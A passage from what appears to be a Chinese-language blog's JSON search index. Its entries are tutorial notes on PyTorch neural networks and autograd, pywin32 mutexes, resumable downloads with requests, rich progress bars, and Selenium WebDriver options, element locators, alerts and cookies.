个类别，分别是飞机、汽车、鸟、猫、鹿、狗、青蛙、马、船和卡车。数据集中的图片都是 3x32x32。一些例子如下所示： 数据并行 在 GPU 上训练模型的做法很简单，如下代码所示，定义一个 device 对象，\n然后用 .to() 方法将网络模型参数放到指定的 GPU 上: device = torch.device(\"cuda:0\")\nmodel.to(device) 接着就是将所有的张量变量放到 GPU 上: mytensor = my_tensor.to(device) 注解 这里 my_tensor.to(device) 是返回一个 my_tensor 的新的拷贝对象，\n而不是直接修改 my_tensor 变量，因此你需要将其赋值给一个新的张量，然后使用这个张量。 Pytorch 默认只会采用一个 GPU，因此需要使用多个 GPU，需要采用 DataParallel ，代码如下所示: model = nn.DataParallel(model) 参考: https://zhuanlan.zhihu.com/p/66543791","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytorch-Example-Training-Classifier.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytorch-Example-Training-Classifier.html"},{"title":"神经网络","text":"在 PyTorch 中 torch.nn 专门用于实现神经网络。\n其中 nn.Module 包含了网络层的搭建，\n以及一个方法 forward(input) ，并返回网络的输出 output . 下面是一个经典的 LeNet 网络，用于对字符进行分类 对于神经网络来说，一个标准的训练流程是这样的： 定义一个多层的神经网络 对数据集的预处理并准备作为网络的输入 将数据输入到网络 计算网络的损失 反向传播，计算梯度 更新网络的梯度，一个简单的更新规则是 weight = weight - learning_rate * gradient 定义网络 首先定义一个神经网络，下面是一个 5 层的卷积神经网络，\n包含两层卷积层和三层全连接层: import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nclass Net(nn.Module):\n\n    def __init__(self):\n        super(Net, self).__init__()\n        # 输入图像是单通道，conv1 kenrnel size=5*5，输出通道 6\n        self.conv1 = nn.Conv2d(1, 6, 5)\n        # conv2 kernel size=5*5, 输出通道 16\n        self.conv2 = nn.Conv2d(6, 16, 5)\n        # 全连接层\n        self.fc1 = nn.Linear(16*5*5, 120)\n        self.fc2 = nn.Linear(120, 84)\n        self.fc3 = nn.Linear(84, 10)\n\n    def forward(self, x):\n        # max-pooling 采用一个 (2,2) 的滑动窗口\n        x = F.max_pool2d(F.relu(self.conv1(x)), (2, 2))\n        # 核(kernel)大小是方形的话，可仅定义一个数字，如 (2,2) 用 2 即可\n        x = F.max_pool2d(F.relu(self.conv2(x)), 2)\n        x = x.view(-1, self.num_flat_features(x))\n        x = F.relu(self.fc1(x))\n        x = F.relu(self.fc2(x))\n        x = self.fc3(x)\n        return x\n\n    def num_flat_features(self, x):\n        # 除了 batch 维度外的所有维度\n        size = x.size()[1:]\n        num_features = 1\n        for s in size:\n            num_features *= s\n        return num_features\n\nnet = Net()\nprint(net) 打印网络结构: Net(\n  (conv1): Conv2d(1, 6, kernel_size=(5, 5), stride=(1, 1))\n  (conv2): Conv2d(6, 16, kernel_size=(5, 5), stride=(1, 1))\n  (fc1): Linear(in_features=400, out_features=120, bias=True)\n  (fc2): Linear(in_features=120, out_features=84, bias=True)\n  (fc3): Linear(in_features=84, out_features=10, bias=True)\n) 这里必须实现 forward 函数，\n而 backward 函数在采用 autograd 时就自动定义好了，\n在 forward 方法可以采用任何的张量操作。 net.parameters() 可以返回网络的训练参数，使用例子如下: params = list(net.parameters())\nprint('参数数量: ', len(params))\n# conv1.weight\nprint('第一个参数大小: ', params[0].size()) 输出: 参数数量:  10\n第一个参数大小:  torch.Size([6, 1, 5, 5]) 然后简单测试下这个网络，随机生成一个 32*32 的输入: # 随机定义一个变量输入网络\ninput = torch.randn(1, 1, 32, 32)\nout = net(input)\nprint(out) 输出结果: tensor([[ 0.1005,  0.0263,  0.0013, -0.1157, -0.1197, -0.0141,  0.1425, -0.0521,\n          0.0689,  0.0220]], grad_fn=<ThAddmmBackward>) 接着反向传播需要先清空梯度缓存，并反向传播随机梯度: # 清空所有参数的梯度缓存，然后计算随机梯度进行反向传播\nnet.zero_grad()\nout.backward(torch.randn(1, 10)) 注解 torch.nn 只支持小批量(mini-batches)数据，也就是输入不能是单个样本，\n比如对于 nn.Conv2d 接收的输入是一个 4 维张量--nSamples * nChannels * Height * Width 。 所以，如果你输入的是单个样本，需要采用 input.unsqueeze(0)\n来扩充一个假的 batch 维度，即从 3 维变为 4 维。 损失函数 损失函数的输入是 (output, target) ，即网络输出和真实标签对的数据，\n然后返回一个数值表示网络输出和真实标签的差距。 PyTorch 中其实已经定义了不少的损失函数，\n这里仅采用简单的均方误差：nn.MSELoss ，例子如下: output = net(input)\n# 定义伪标签\ntarget = torch.randn(10)\n# 调整大小，使得和 output 一样的 size\ntarget = target.view(1, -1)\ncriterion = nn.MSELoss()\n\nloss = criterion(output, target)\nprint(loss) 输出如下: tensor(0.6524, grad_fn=<MseLossBackward>) 这里，整个网络的数据输入到输出经历的计算图如下所示，其实也就是数据从输入层到输出层，计算 loss 的过程: input -> conv2d -> relu -> maxpool2d -> conv2d -> relu -> maxpool2d\n      -> view -> linear -> relu -> linear -> relu -> linear\n      -> MSELoss\n      -> loss 如果调用 loss.backward() ，那么整个图都是可微分的，\n也就是说包括 loss ，图中的所有张量变量，\n只要其属性 requires_grad=True ，那么其梯度 .grad张量都会随着梯度一直累计。 用代码来说明: # MSELoss\nprint(loss.grad_fn)\n# Linear layer\nprint(loss.grad_fn.next_functions[0][0])\n# Relu\nprint(loss.grad_fn.next_functions[0][0].next_functions[0][0]) 输出: <MseLossBackward object at 0x0000019C0C349908>\n\n<ThAddmmBackward object at 0x0000019C0C365A58>\n\n<ExpandBackward object at 0x0000019C0C3659E8> 反向传播 反向传播的实现只需要调用 loss.backward() 即可，\n当然首先需要清空当前梯度缓存，即.zero_grad() 方法，\n否则之前的梯度会累加到当前的梯度，这样会影响权值参数的更新。 下面是一个简单的例子，以 conv1 层的偏置参数 bias 在反向传播前后的结果为例: # 清空所有参数的梯度缓存\nnet.zero_grad()\nprint('conv1.bias.grad before backward')\nprint(net.conv1.bias.grad)\n\nloss.backward()\n\nprint('conv1.bias.grad after backward')\nprint(net.conv1.bias.grad) 输出结果: conv1.bias.grad before backward\ntensor([0., 0., 0., 0., 0., 0.])\n\nconv1.bias.grad after backward\ntensor([ 0.0069,  0.0021,  0.0090, -0.0060, -0.0008, -0.0073]) 更新权重 采用随机梯度下降(Stochastic Gradient Descent, SGD)方法的最简单的更新权重规则如下: weight = weight - learning_rate * gradient 按照这个规则，代码实现如下所示: # 简单实现权重的更新例子\nlearning_rate = 0.01\nfor f in net.parameters():\n    f.data.sub_(f.grad.data * learning_rate) 但是这只是最简单的规则，深度学习有很多的优化算法，\n不仅仅是 SGD，还有 Nesterov-SGD, Adam, RMSProp 等等，为了采用这些不同的方法，\n这里采用 torch.optim 库，使用例子如下所示: import torch.optim as optim\n# 创建优化器\noptimizer = optim.SGD(net.parameters(), lr=0.01)\n\n# 在训练过程中执行下列操作\noptimizer.zero_grad() # 清空梯度缓存\noutput = net(input)\nloss = criterion(output, target)\nloss.backward()\n# 更新权重\noptimizer.step() 注意，同样需要调用 optimizer.zero_grad() 方法清空梯度缓存。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytorch-Neural-Networks.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytorch-Neural-Networks.html"},{"title":"autograd-自动梯度","text":"提供了对 Tensors 上所有运算操作的自动微分功能，也就是计算梯度的功能。\n它属于 define-by-run 类型框架，即反向传播操作的定义是根据代码的运行方式，因此每次迭代都可以是不同的。 Tensor梯度计算 torch.Tensor 是 Pytorch 最主要的库，\n当设置它的属性 .requires_grad=True，\n那么就会开始追踪在该变量上的所有操作，而完成计算后，\n可以调用 .backward() 并自动计算所有的梯度，得到的梯度都保存在属性 .grad 中。 调用 .detach() 方法分离出计算的历史，\n可以停止一个 tensor 变量继续追踪其历史信息 ，同时也防止未来的计算会被追踪。 而如果是希望防止跟踪历史（以及使用内存），可以将代码块放在 with torch.no_grad(): 内，\n这个做法在使用一个模型进行评估的时候非常有用，\n因为模型会包含一些带有 requires_grad=True 的训练参数，但实际上并不需要它们的梯度信息。 对于 autograd 的实现，还有一个类也是非常重要-- Function 。 Tensor 和 Function 两个类是有关联并建立了一个非循环的图，\n可以编码一个完整的计算记录。\n每个 tensor 变量都带有属性 .grad_fn ，\n该属性引用了创建了这个变量的 Function （除了由用户创建的 Tensors，它们的 grad_fn=None )。 如果要进行求导运算，可以调用一个 Tensor 变量的方法 .backward() 。\n如果该变量是一个标量，即仅有一个元素，\n那么不需要传递任何参数给方法 .backward()，\n当包含多个元素的时候，就必须指定一个 gradient 参数，表示匹配尺寸大小的 tensor， 如: import torch\n\n# 开始创建一个 tensor， 并让 requires_grad=True 来追踪该变量相关的计算操作：\n\nx = torch.ones(2, 2, requires_grad=True)\nprint(x)\n# tensor([[1., 1.],\n#         [1., 1.]], requires_grad=True)\n\n\n# 执行任意计算操作，这里进行简单的加法运算：\ny = x + 2\nprint(y)\n# tensor([[3., 3.],\n#         [3., 3.]], grad_fn=<AddBackward>)\n\n# y 是一个操作的结果，所以它带有属性 grad_fn：\nprint(y.grad_fn)\n# <AddBackward object at 0x00000216D25DCC88>\n\n\n# 继续对变量 y 进行操作：\nz = y * y * 3\nout = z.mean()\n\nprint('z=', z)\n\n# z= tensor([[27., 27.],\n#         [27., 27.]], grad_fn=<MulBackward>)\n\nprint('out=', out)\n# out= tensor(27., grad_fn=<MeanBackward1>) 注解 实际上，一个 Tensor 变量的默认 requires_grad 是 False ，\n可以像上述定义一个变量时候指定该属性是 True，\n当然也可以定义变量后，调用 .requires_grad_(True) 设置为 True ，\n这里带有后缀 _ 是会改变变量本身的属性 如: a = torch.randn(2, 2)\na = ((a * 3) / (a - 1))\nprint(a.requires_grad)      # False\na.requires_grad_(True)\nprint(a.requires_grad)      # True\nb = (a * a).sum()\nprint(b.grad_fn)            # <SumBackward0 object at 0x00000216D25ED710> 反向传播: out.backward()\n# 输出梯度 d(out)/dx\nprint(x.grad)\n\n# tensor([[4.5000, 4.5000],\n      [4.5000, 4.5000]]) 上面的out计算过程: 定义 x 为 2*2 的 1\ny = x + 2\nz = y * y * 3 = 3 * (x+2)&#94;2 求导就是 每个 X 都是1. 从数学上来说，如果你有一个向量值函数: 那么对应的梯度是一个雅克比矩阵(Jacobian matrix) 一般来说，torch.autograd 就是用于计算雅克比向量(vector-Jacobian)乘积的工具。\n这里略过数学公式，直接上代码例子介绍: x = torch.randn(3, requires_grad=True)\n\ny = x * 2\nwhile y.data.norm() < 1000:\n    y = y * 2\n\nprint(y) 输出结果: tensor([ 237.5009, 1774.2396,  274.0625], grad_fn=<MulBackward>) 这里得到的变量 y 不再是一个标量，torch.autograd 不能直接计算完整的雅克比行列式，\n但我们可以通过简单的传递向量给 backward() 方法作为参数得到雅克比向量的乘积，\n例子如下所示: v = torch.tensor([0.1, 1.0, 0.0001], dtype=torch.float)\ny.backward(v)\n\nprint(x.grad) 输出结果: tensor([ 102.4000, 1024.0000,    0.1024]) 最后，加上 with torch.no_grad() 就可以停止追踪变量历史进行自动梯度计算: print(x.requires_grad)\nprint((x ** 2).requires_grad)\n\nwith torch.no_grad():\n    print((x ** 2).requires_grad) 输出结果: True\n\nTrue\n\nFalse","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytorch-autoGrad.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytorch-autoGrad.html"},{"title":"pywin32","text":"pypi地址:: pywin32 安装: python -m pip install --upgrade pywin32 这下面包含的包有点多, 都是针对与windows的. 其他平台无法安装 Win32gui: Windows图形界面接口模块。主要负责操作窗口切换以及窗口中元素id标签的获取 Win32api: Windows开发接口模块。主要负责模拟键盘和鼠标操作,对win32gui获取的标签进行点击/获取值/修改值等操作 Win32con: 全面的库函数，提供Win32gui和Win32api需要的操作参数 win32event: 提供 互斥锁, 信号相关 windows Api . 参见: github/wuxc/pywin32doc/win32event win32event CreateMutex CreateMutex(MutexAttributes, InitialOwner, Name) 创建信号量, 支持windows下的跨进程(主要依赖于 Name) 参数 MutexAttributes: 对象描述符指针, 默认None InitialOwner: bool 初始所有权标志. 如果此值为 TRUE ，并且调用方创建了互斥体，则调用线程获取互斥体对象的初始所有权。\n否则，调用线程不会获取互斥体的所有权。 Name: str 互斥量命名, 可在其他进程中获取 返回 如果函数成功，则返回值是新创建的互斥体对象的句柄。 如果函数失败，则返回值为 NULL。 如果互斥体是命名互斥体，并且此函数调用之前存在对象，则返回值是现有对象的句柄， 并且 GetLastError 函数返回 ERROR_ALREADY_EXISTS。 可参见: microsoft-createmutexa ReleaseMutex 释放互斥体","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pywin32.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pywin32.html"},{"title":"redis","text":"","tags":"数据库","url":"/yq-docs-rear-end-python-python-three--party-library-redis.html","loc":"/yq-docs-rear-end-python-python-three--party-library-redis.html"},{"title":"requests","text":"下载文件 小文件 小文件: import requests\n\nurl = \"http://www.test.com/xxxxx/test.jpg\"\npath = r\"c:\\test.jpg\"\n\nreq = requests.get(url)\nwith open(path, \"wb\") as f:\n    f.write(req.content) 大文件 断点续传: import sys\nimport requests\nimport os\n\n\nclass Downloader(object):\n    def __init__(self, url, file_path):\n        self.url = url\n        self.file_path = file_path\n\n    def start(self):\n        res_length = requests.get(self.url, stream=True)\n        total_size = int(res_length.headers['Content-Length'])\n        print(res_length.headers)\n        print(res_length)\n        if os.path.exists(self.file_path):\n            temp_size = os.path.getsize(self.file_path)\n            print(\"当前：%d 字节， 总：%d 字节， 已下载：%2.2f%% \" % (temp_size, total_size, 100 * temp_size / total_size))\n        else:\n            temp_size = 0\n            print(\"总：%d 字节，开始下载...\" % (total_size,))\n\n        headers = {'Range': 'bytes=%d-' % temp_size,\n                  \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\"}\n        res_left = requests.get(self.url, stream=True, headers=headers)\n\n        with open(self.file_path, \"ab\") as f:\n            for chunk in res_left.iter_content(chunk_size=1024):\n                temp_size += len(chunk)\n                f.write(chunk)\n                f.flush()\n\n                done = int(50 * temp_size / total_size)\n                sys.stdout.write(\"\\r[%s%s] %d%%\" % ('█' * done, ' ' * (50 - done), 100 * temp_size / total_size))\n                sys.stdout.flush()\n\n\nif __name__ == '__main__':\n    url = \"http://www.test.com/xxxxx/test.jpg\"\n    path = r\"c:\\test.jpg\"\n    downloader = Downloader(url, path)\n    downloader.start() 注解 若文件下载 url 存在重定向, 则使用 allow_redirects=True requests.get(url, allow_redirects=True) 分块下载使用 stream=True requests.get(url, stream=True) 断点续传需要指定 headers 下的 Range 字段 来指定范围 # 或者 headers = {'Range': 'bytes=%d-'%(start,)}\nheaders = {'Range': 'bytes=%d-%d'%(start,end)} 关于文件下载时候的路径 当从一个url下载文件时候, 若使用绝对路径, 不会有问题. 但可能有时候不想使用绝对路径, 而是使用相对路径, 那么这个时候可能就会\n存在给定的下载路径正确, 但就是说路径不存在, 下载不了, 也没发使用python执行(若是可执行文件). 这个时候可能是文件名的命名使用了url编码的缘故,\n而其中可能有些特殊字符不能被python正常解析, 故而导致的这个问题\n将名称使用url解码即可: urllib.parse.unquote(url_path)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-requests.html","loc":"/yq-docs-rear-end-python-python-three--party-library-requests.html"},{"title":"rich","text":"关于进度条可参见: ProgressInPy 安装: pip install rich 与 tqdm 一起弄彩色进度条: from tqdm.rich import tqdm, trange\n\ndef print_hi():\n    n = 10000\n    for i in trange(n):\n        for j in range(n):\n            j += i 效果","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-rich.html","loc":"/yq-docs-rear-end-python-python-three--party-library-rich.html"},{"title":"Actions接口","text":"参考: https://www.selenium.dev/zh-cn/documentation/webdriver/actions_api/","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Actions-interface.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Actions-interface.html"},{"title":"浏览器加载选项","text":"pageLoadStrategy 页面加载策略: 策略 就绪状态 备注 normal complete 默认值, 等待所有资源下载 eager interactive DOM 访问已准备就绪, 但诸如图像的其他资源可能仍在加载 none Any 完全不会阻塞 WebDriver 示例(Options): from selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\n\noptions = Options()\n\n# 阻塞等待页面资源加载\noptions.page_load_strategy = 'normal'\n\n# WebDriver一直等到 DOMContentLoaded 事件触发并返回.\n# options.page_load_strategy = 'eager'\n\n# WebDriver 仅等待初始页面已下载.\n# options.page_load_strategy = 'none'\n\ndriver = webdriver.Chrome(options=options)\ndriver.get(\"http://www.google.com\")\ndriver.quit() platformName 标识了远端的操作系统, 获取 platformName 将返回操作系统的名称 acceptInsecureCerts 检查在会话期间导航时 是否使用了过期的 (或) 无效的 TLS Certificate 如果将功能设置为 false, 则页面浏览遇到任何域证书问题时, 将返回insecure certificate error .\n如果设置为 true, 则浏览器将信任无效证书. 默认情况下, 此功能将信任所有自签名证书. 设置后, acceptInsecureCerts 功能将在整个会话中生效. timeouts WebDriver session 具有一定的 session timeout 间隔, 在此间隔内, 用户可以控制执行脚本或从浏览器检索信息的行为. 每个会话超时都配置有不同 timeouts 的组合, 如下所述: Script Timeout:\n指定在当前浏览上下文中, 中断正在执行脚本的时机.\nWebDriver创建新会话时, 将设置默认的超时时间为 30,000 . Page Load Timeout:\n指定在当前浏览上下文中, 加载网页的时间间隔.\nWebDriver创建新会话时, 默认设置超时时间为 300,000 .\n如果页面加载限制了给定 (或默认) 的时间范围, 则该脚本将被 TimeoutException 停止. Implicit Wait Timeout\n指定在定位元素时, 等待隐式元素定位策略的时间.\nWebDriver创建新会话时, 将设置默认超时时间为 0 . unhandledPromptBehavior 指定当前会话 user prompt handler 的状态. 默认为 dismiss and notify state . User Prompt Handler 这定义了在远端出现用户提示时必须采取的措施. 该行为由unhandledPromptBehavior 功能定义, 具有以下状态: dismiss accept dismiss and notify accept and notify ignore setWindowRect 用于所有支持 调整大小和重新定位 命令 的远程终端. strictFileInteractability 用于是否对 类型为文件的输入(input type=file) 元素进行严格的交互性检查.\n默认关闭严格性检查, 在将 元素的Send Keys 方法作用于隐藏的文件上传时, 会有控制方面的行为区别. proxy 代理服务器充当客户端和服务器之间的请求中介. 简述而言, 流量将通过代理服务器流向您请求的地址, 然后返回. 使用代理服务器用于Selenium的自动化脚本, 可能对以下方面有益: 捕获网络流量 模拟网站后端响应 在复杂的网络拓扑结构或严格的公司限制/政策下访问目标站点. 如果您在公司环境中, 并且浏览器无法连接到URL, 则最有可能是因为环境, 需要借助代理进行访问. 设置代理的方式: from selenium import webdriver\n\nPROXY = \"<HOST:PORT>\"\nwebdriver.DesiredCapabilities.FIREFOX['proxy'] = {\n\"httpProxy\": PROXY,\n\"ftpProxy\": PROXY,\n\"sslProxy\": PROXY,\n\"proxyType\": \"MANUAL\",\n\n}\n\nwith webdriver.Firefox() as driver:\n# Open URL\n    driver.get(\"https://selenium.dev\")","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Browser-loading-option.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Browser-loading-option.html"},{"title":"元素支持","text":"文件上传 不能直接与上传的Dialog交互, 不过对于 input 标签的上传, 可以设置路径: file_input = driver.find_element(By.CSS_SELECTOR, \"input[type='file']\")\nfile_input.send_keys(upload_file)\ndriver.find_element(By.ID, \"file-submit\").click() 元素查找 对于以下内容而言: <ol id=\"vegetables\">\n<li class=\"potatoes\">…\n<li class=\"onions\">…\n<li class=\"tomatoes\"><span>Tomato is a Vegetable</span>…\n</ol>\n<ul id=\"fruits\">\n  <li class=\"bananas\">…\n  <li class=\"apples\">…\n  <li class=\"tomatoes\"><span>Tomato is a Fruit</span>…\n</ul> 查询某一个标签, 只会 返回第一个匹配的元素 : vegetable = driver.find_element(By.CLASS_NAME, \"tomatoes\") 可以通过 子元素查找 : fruits = driver.find_element(By.ID, \"fruits\")\nfruit = fruits.find_element(By.CLASS_NAME,\"tomatoes\") 优化, 可以直接使用 CSS选择器 fruit = driver.find_element(By.CSS_SELECTOR,\"#fruits .tomatoes\") 若需要 查找所有元素 , 使用 复数形式(find_elements) 查找: plants = driver.find_elements(By.TAG_NAME, \"li\") 获取当前 激活/聚焦的元素 from selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\ndriver = webdriver.Chrome()\ndriver.get(\"https://www.google.com\")\ndriver.find_element(By.CSS_SELECTOR, '[name=\"q\"]').send_keys(\"webElement\")\n\n  # Get attribute of current active element\nattr = driver.switch_to.active_element.get_attribute(\"title\")\nprint(attr) Web元素交互 仅有五种基本命令可用于元素的操作: 点击 (适用于任何元素)\n元素点击命令 执行在 元素中央. 如果元素中央由于某些原因被 遮挡 ,\nSelenium将返回一个 元素点击中断 错误.: # Navigate to url\ndriver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n# Click on the element\ndriver.find_element(By.NAME, \"color_input\").click() 发送键位 (仅适用于文本字段和内容可编辑元素)\n元素发送键位命令 将录入提供的键位到 可编辑的 元素.\n通常, 这意味着元素是具有 文本 类型的表单的输入元素或具有 内容可编辑 属性的元素.\n如果不可编辑, 则返回 无效元素状态 错误.: # Navigate to url\n      driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n# Clear field to empty it from any previous data\n      driver.find_element(By.NAME, \"email_input\").clear()\n\n      # Enter Text\n      driver.find_element(By.NAME, \"email_input\").send_keys(\"admin@localhost.dev\" ) 清除 (仅适用于文本字段和内容可编辑元素)\n元素清除命令 重置元素的内容 . 这要求元素 可编辑 , 且 可重置 .\n通常, 这意味着元素是具有 文本 类型的表单的输入元素或具有 内容可编辑 属性的元素.\n如果不满足这些条件, 将返回 无效元素状态 错误.: # Navigate to url\n      driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n# Clear field to empty it from any previous data\n      driver.find_element(By.NAME, \"email_input\").clear() 提交 (仅适用于表单元素)\n在Selenium 4中, 不再通过单独的端点以及脚本执行的方法来实现.\n因此, 建议不要使用此方法, 而是单击相应的表单提交按钮. 选择 (参见 选择列表元素) 设计目的是尽量模拟用户体验, 会事先做以下事情: 如果它确定元素在视口之外, 则会将元素滚动到视图中, 特别是将元素底部与视口底部对齐 确保元素在执行操作之前是可交互的 . 这可能意味着滚动不成功, 或者该元素没有以其他方式显示.\n确定某个元素是否显示在页面上太难了 无法直接在webdriver规范中定义,\n因此Selenium发送一个带有JavaScript原子的执行命令, 检查是否有可能阻止该元素显示.\n如果确定某个元素不在视口中, 不显示, 不可 键盘交互, 或不可 指针交互, 则返回一个元素不可交互 错误 元素定位策略 在 WebDriver 中有 8 种不同的内置元素定位策略： 定位器 Locator 描述 class name 定位class属性与搜索值匹配的元素（不允许使用复合类名） css selector 定位 CSS 选择器匹配的元素 id 定位 id 属性与搜索值匹配的元素 name 定位 name 属性与搜索值匹配的元素 link text 定位link text可视文本与搜索值 完全匹配 的锚元素. 如 href 标签内的文本 partial link text 定位link text可视文本部分与搜索值 部分匹配 的锚点元素。如果匹配多个元素，则只选择第一个元素。 tag name 定位标签名称与搜索值匹配的元素 xpath 定位与 XPath 表达式匹配的元素 相对定位器 4.0提供新功能.\n假设有一个登陆界面: 由于某些原因不方便直接定位 邮箱 元素, 那么可以通过下面的 密码 元素定位: email_locator = locate_with(By.TAG_NAME, \"input\").above({By.ID: \"password\"}) 支持以下: Above, 某元素上方 Below, 某元素下方: password_locator = locate_with(By.TAG_NAME, \"input\").below({By.ID: \"email\"}) Left of, 代码中是 to_left_of :: cancel_locator = locate_with(By.TAG_NAME, \"button\").to_left_of({By.ID: \"submit\"}) Right of, to_right_of :: submit_locator = locate_with(By.TAG_NAME, \"button\").to_right_of({By.ID: \"cancel\"}) Near, email_locator = locate_with(By.TAG_NAME, \"input\").near({By.ID: \"lbl-email\"}) 支持链式调用: submit_locator = locate_with(By.TAG_NAME, \"button\").below({By.ID: \"email\"}).to_right_of({By.ID: \"cancel\"}) 网络元素的信息 参考: https://www.selenium.dev/zh-cn/documentation/webdriver/elements/information/ 支持以下查询: 是否显示: # Navigate to the url\ndriver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n# Get boolean value for is element display\nis_email_visible = driver.find_element(By.NAME, \"email_input\").is_displayed() 是否启用: # Navigate to url\ndriver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n# Returns true if element is enabled else returns false\nvalue = driver.find_element(By.NAME, 'button_input').is_enabled() 是否被选定: # Navigate to url\ndriver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n# Returns true if element is checked else returns false\nvalue = driver.find_element(By.NAME, \"checkbox_input\").is_selected() 获取元素标签名: # Navigate to url\ndriver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n    # Returns TagName of the element\nattr = driver.find_element(By.NAME, \"email_input\").tag_name 获取参照元素的尺寸和坐标, 数据主体包含以下详细信息： 元素左上角的X轴位置 元素左上角的y轴位置 元素的高度 元素的宽度 例: # Navigate to url\ndriver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n    # Returns height, width, x and y coordinates referenced element\nres = driver.find_element(By.NAME, \"range_input\").rect 获取元素CSS值 # Navigate to Url\ndriver.get('https://www.selenium.dev/selenium/web/colorPage.html')\n\n    # Retrieves the computed style property 'color' of linktext\ncssValue = driver.find_element(By.ID, \"namedColor\").value_of_css_property('background-color') 获取特定元素渲染后的文本内容: # Navigate to url\ndriver.get(\"https://www.selenium.dev/selenium/web/linked_image.html\")\n\n    # Retrieves the text of the element\ntext = driver.find_element(By.ID, \"justanotherlink\").text 获取特性或属性: # Navigate to the url\ndriver.get(\"https://www.selenium.dev/selenium/web/inputs.html\")\n\n# Identify the email text box\nemail_txt = driver.find_element(By.NAME, \"email_input\")\n\n# Fetch the value property associated with the textbox\nvalue_info = email_txt.get_attribute(\"value\")","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Element-support.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Element-support.html"},{"title":"Grid-并行支持","text":"参考: https://www.selenium.dev/zh-cn/documentation/grid/","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Grid-parallel-support.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Grid-parallel-support.html"},{"title":"安装","text":"Python的安装: pip install selenium 其他语言的安装参考: https://www.selenium.dev/zh-cn/documentation/webdriver/getting_started/install_library/ 如Java的 pom.xml : <dependency>\n    <groupId>org.seleniumhq.selenium</groupId>\n    <artifactId>selenium-java</artifactId>\n    <version>4.15.0</version>\n</dependency>","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Install.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Install.html"},{"title":"交互","text":"获取浏览器信息 获取标题 从浏览器中读取当前页面的标题: driver.title 获取当前 URL: driver.current_url 浏览器导航 启动浏览器后的第一件事就是打开网站: // 简便的方法\ndriver.get(\"https://selenium.dev\");\n\n// 更长的方法\ndriver.navigate().to(\"https://selenium.dev\"); 按下浏览器的后退按钮: driver.navigate().back(); 按下浏览器的前进键: driver.navigate().forward(); 刷新页面: driver.navigate().refresh(); 警告框 Alerts 警告框 其中最基本的称为警告框, 它显示一条自定义消息, 以及一个用于关闭该警告的按钮,\n在大多数浏览器中标记为\"确定\"(OK).\n在大多数浏览器中, 也可以通过按\"关闭\"(close)按钮将其关闭, 但这始终与\"确定\"按钮具有相同的作用 WebDriver可以从弹窗获取文本并接受或关闭这些警告.: # Click the link to activate the alert\ndriver.find_element(By.LINK_TEXT, \"See an example alert\").click()\n\n# Wait for the alert to be displayed and store it in a variable\nalert = wait.until(expected_conditions.alert_is_present())\n\n# Store the alert text in a variable\ntext = alert.text\n\n# Press the OK button\nalert.accept() Confirm 确认框 确认框类似于警告框, 不同之处在于用户还可以选择取消消息.\n此示例还呈现了警告的另一种实现: # Click the link to activate the alert\ndriver.find_element(By.LINK_TEXT, \"See a sample confirm\").click()\n\n# Wait for the alert to be displayed\nwait.until(expected_conditions.alert_is_present())\n\n# Store the alert in a variable for reuse\nalert = driver.switch_to.alert\n\n# Store the alert text in a variable\ntext = alert.text\n\n# Press the Cancel button\nalert.dismiss() Prompt 提示框 提示框与确认框相似, 不同之处在于它们还包括文本输入.\n与处理表单元素类似, 您可以使用WebDriver的sendKeys来填写响应.\n这将完全替换占位符文本. 按下取消按钮将不会提交任何文本: # Click the link to activate the alert\ndriver.find_element(By.LINK_TEXT, \"See a sample prompt\").click()\n\n# Wait for the alert to be displayed\nwait.until(expected_conditions.alert_is_present())\n\n# Store the alert in a variable for reuse\nalert = Alert(driver)\n\n# Type your message\nalert.send_keys(\"Selenium\")\n\n# Press the OK button\nalert.accept() cookies Cookie是从网站发送并存储在您的计算机中的一小段数据. Cookies主要用于识别用户并加载存储的信息. WebDriver API提供了一种使用内置的方法与Cookie进行交互: 添加 Cookie 这个方法常常用于将cookie添加到当前访问的上下文中. 添加Cookie仅接受一组已定义的可序列化JSON对象\n首先, 您需要位于有效Cookie的域上. 如果您在开始与网站进行交互之前尝试预设cookie,\n并且您的首页很大或需要一段时间才能加载完毕, 则可以选择在网站上找到一个较小的页面: from selenium import webdriver\n\ndriver = webdriver.Chrome()\n\ndriver.get(\"http://www.example.com\")\n\n# Adds the cookie into current browser context\ndriver.add_cookie({\"name\": \"key\", \"value\": \"value\"}) 获取命名的 Cookie 此方法返回与cookie名称匹配的序列化cookie数据中所有关联的cookie.: from selenium import webdriver\n\ndriver = webdriver.Chrome()\n\n# Navigate to url\ndriver.get(\"http://www.example.com\")\n\n# Adds the cookie into current browser context\ndriver.add_cookie({\"name\": \"foo\", \"value\": 